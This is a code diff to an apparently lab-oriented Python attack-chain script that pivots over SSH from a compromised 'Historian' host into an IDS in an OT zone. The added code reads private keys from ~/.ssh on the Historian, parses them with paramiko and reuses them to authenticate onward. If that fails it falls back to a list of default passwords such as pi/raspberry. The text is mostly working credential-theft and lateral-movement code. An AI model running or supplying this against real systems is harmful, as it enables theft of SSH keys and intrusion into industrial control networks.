@@ -4,6 +4,7 @@
 import subprocess
 import sys
 import os
+import io
 import time
 import json
 import argparse
@@ -250,12 +251,13 @@ def ssh_hop(
     target_ip: str,
     target_port: int,
     target_user: str,
-    target_pass: str,
+    target_pass: str | None = None,
+    pkey: paramiko.PKey | None = None,
 ) -> paramiko.SSHClient:
     """
     Tunnel an SSH connection through an already-connected jump host.
+    Authenticate with either a password or a stolen PKey (never both).
     Returns a fully authenticated SSHClient connected via the jump's transport.
-    This lets us reach hosts that only accept connections from the jump's IP.
     """
     transport = jump.get_transport()
     dest_addr  = (target_ip,  target_port)
@@ -269,12 +271,14 @@ def ssh_hop(
         port=target_port,
         username=target_user,
         password=target_pass,
+        pkey=pkey,
         sock=chan,
         timeout=15,
         allow_agent=False,
         look_for_keys=False,
     )
-    ok(f"SSH hop → {target_user}@{target_ip}:{target_port}")
+    auth_method = "stolen key" if pkey else "password"
+    ok(f"SSH hop → {target_user}@{target_ip}:{target_port}  [{auth_method}]")
     return inner
 
 
@@ -809,6 +813,45 @@ def phase4_ssh_pivot() -> PhaseResult:
         console.print("\n[bold cyan]Hopping Historian → IDS (OT zone)[/bold cyan]")
         info(f"Tunnelling SSH through Historian → {ids_user}@{ids_ip}:{ids_port}")
 
+        # ── 4a. SSH Key Hunting — check Historian's own key first ───────────
+        # A blind attacker who can't guess the IDS password can still pivot if
+        # the Historian admin has a pre-authorised key pair trusted by the IDS.
+        stolen_pkey: paramiko.PKey | None = None
+        console.print("\n[bold cyan]SSH Key Hunt — searching Historian ~/.ssh/[/bold cyan]")
+        key_out, _, key_rc = ssh_run(hist_client,
+            "ls -la ~/.ssh/id_rsa 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || "
+            "ls -la ~/.ssh/id_ed25519 2>/dev/null && cat ~/.ssh/id_ed25519 2>/dev/null || "
+            "echo __NO_KEY__")
+
+        if "-----BEGIN" in key_out:
+            # Extract just the PEM block (everything from -----BEGIN to -----END)
+            pem_lines = []
+            in_block  = False
+            for line in key_out.splitlines():
+                if "-----BEGIN" in line:
+                    in_block = True
+                if in_block:
+                    pem_lines.append(line)
+                if "-----END" in line and in_block:
+                    break
+            pem = "\n".join(pem_lines) + "\n"
+
+            try:
+                # Try RSA first, then Ed25519
+                try:
+                    stolen_pkey = paramiko.RSAKey.from_private_key(io.StringIO(pem))
+                except paramiko.SSHException:
+                    stolen_pkey = paramiko.Ed25519Key.from_private_key(io.StringIO(pem))
+
+                ok("[bold green][+] Stolen SSH Private Key found on Historian! "
+                   "Attempting passwordless pivot...[/bold green]")
+            except Exception as key_parse_err:
+                warn(f"Key found but could not parse it: {key_parse_err}")
+                stolen_pkey = None
+        else:
+            warn("No private key found on Historian — falling back to password list")
+
+        # ── 4b. Attempt hop: stolen key first, then password fallbacks ───────
         IDS_FALLBACKS = [
             (ids_user, ids_pass),           # primary from CFG (tried first)
             ("pi",      "raspberry"),
@@ -819,27 +862,57 @@ def phase4_ssh_pivot() -> PhaseResult:
 
         ids_client = None
         last_exc: Exception | None = None
-        for attempt_user, attempt_pass in IDS_FALLBACKS:
-            try:
-                info(f"Trying IDS creds: {attempt_user}@{ids_ip}")
-                ids_client = ssh_hop(hist_client, ids_ip, ids_port,
-                                     attempt_user, attempt_pass)
-                # Success — patch CFG so Phase 5 / 6 pick up the right creds
-                if attempt_user != ids_user or attempt_pass != ids_pass:
-                    CFG["ids"]["username"] = attempt_user
-                    CFG["ids"]["password"] = attempt_pass
+
+        # Try the stolen key against all plausible usernames before touching passwords
+        if stolen_pkey:
+            key_users = list(dict.fromkeys(
+                [ids_user, "pi", "admin", "student", "kali"]
+            ))
+            for ku in key_users:
+                try:
+                    info(f"Trying stolen key as {ku}@{ids_ip}")
+                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
+                                         ku, pkey=stolen_pkey)
+                    # Update CFG so later phases use the right user
+                    if ku != ids_user:
+                        CFG["ids"]["username"] = ku
+                    CFG["ids"]["password"] = ""   # key auth — no password needed
                     console.print(Panel(
-                        f"[bold white]Username :[/bold white] [bold yellow]{attempt_user}[/bold yellow]\n"
-                        f"[bold white]Password :[/bold white] [bold yellow]{attempt_pass}[/bold yellow]\n\n"
+                        f"[bold white]Method   :[/bold white] [bold green]Stolen SSH Private Key[/bold green]\n"
+                        f"[bold white]Username :[/bold white] [bold yellow]{ku}[/bold yellow]\n"
+                        f"[bold white]Host     :[/bold white] [bold yellow]{ids_ip}[/bold yellow]\n\n"
                         f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
-                        title="[bold yellow] IDS Credentials Auto-Corrected [/bold yellow]",
-                        border_style="yellow",
+                        title="[bold green] IDS PIVOTED VIA STOLEN KEY [/bold green]",
+                        border_style="green",
                         expand=False,
                     ))
-                break   # got a live client — stop trying
-            except paramiko.AuthenticationException as exc:
-                warn(f"  Auth failed: {attempt_user}@{ids_ip}")
-                last_exc = exc
+                    break
+                except paramiko.AuthenticationException as exc:
+                    warn(f"  Key rejected for {ku}@{ids_ip}")
+                    last_exc = exc
+
+        # If key auth didn't work (or no key), try password list
+        if ids_client is None:
+            for attempt_user, attempt_pass in IDS_FALLBACKS:
+                try:
+                    info(f"Trying IDS creds: {attempt_user}@{ids_ip}")
+                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
+                                         attempt_user, attempt_pass)
+                    if attempt_user != ids_user or attempt_pass != ids_pass:
+                        CFG["ids"]["username"] = attempt_user
+                        CFG["ids"]["password"] = attempt_pass
+                        console.print(Panel(
+                            f"[bold white]Username :[/bold white] [bold yellow]{attempt_user}[/bold yellow]\n"
+                            f"[bold white]Password :[/bold white] [bold yellow]{attempt_pass}[/bold yellow]\n\n"
+                            f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
+                            title="[bold yellow] IDS Credentials Auto-Corrected [/bold yellow]",
+                            border_style="yellow",
+                            expand=False,
+                        ))
+                    break
+                except paramiko.AuthenticationException as exc:
+                    warn(f"  Auth failed: {attempt_user}@{ids_ip}")
+                    last_exc = exc
 
         if ids_client is None:
             raise last_exc  # bubble up so the outer except block catches it
@@ -1187,22 +1260,43 @@ def main():
             results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
             continue
 
-        phase_start = time.monotonic()
-        r = fn()
-        phase_elapsed = time.monotonic() - phase_start
+        while True:
+            phase_start = time.monotonic()
+            r = fn()
+            phase_elapsed = time.monotonic() - phase_start
+
+            status_color = "green" if r.status == "success" else "red" if r.status == "failed" else "yellow"
+            console.print(
+                f"\n[dim]Phase {n} complete — "
+                f"[{status_color}]{r.status.upper()}[/{status_color}]  "
+                f"elapsed [bold]{phase_elapsed:.1f}s[/bold][/dim]"
+            )
+
+            if r.status != "failed" or args.auto:
+                break   # success / skipped, or auto mode — move on
+
+            console.print()
+            choice = Prompt.ask(
+                "[red]Phase failed[/red] — what next?",
+                choices=["r", "c", "q"],
+                default="c",
+            )
+            console.print("[dim]  r = retry  |  c = continue to next phase  |  q = quit[/dim]")
+
+            if choice == "r":
+                warn(f"Retrying Phase {n}: {title} ...")
+                continue        # re-run fn()
+            elif choice == "q":
+                results.append(r)
+                console.print("[bold red]Aborted by operator.[/bold red]")
+                chain_elapsed = time.monotonic() - chain_start
+                console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
+                print_report()
+                return
+            else:
+                break           # continue to next phase
+
         results.append(r)
-
-        # Per-phase elapsed time — always shown, no fake progress bar
-        status_color = "green" if r.status == "success" else "red" if r.status == "failed" else "yellow"
-        console.print(
-            f"\n[dim]Phase {n} complete — "
-            f"[{status_color}]{r.status.upper()}[/{status_color}]  "
-            f"elapsed [bold]{phase_elapsed:.1f}s[/bold][/dim]"
-        )
-
-        if r.status == "failed" and not args.auto:
-            if not Confirm.ask("[red]Phase failed — continue?[/red]", default=True):
-                break
 
     chain_elapsed = time.monotonic() - chain_start
     console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
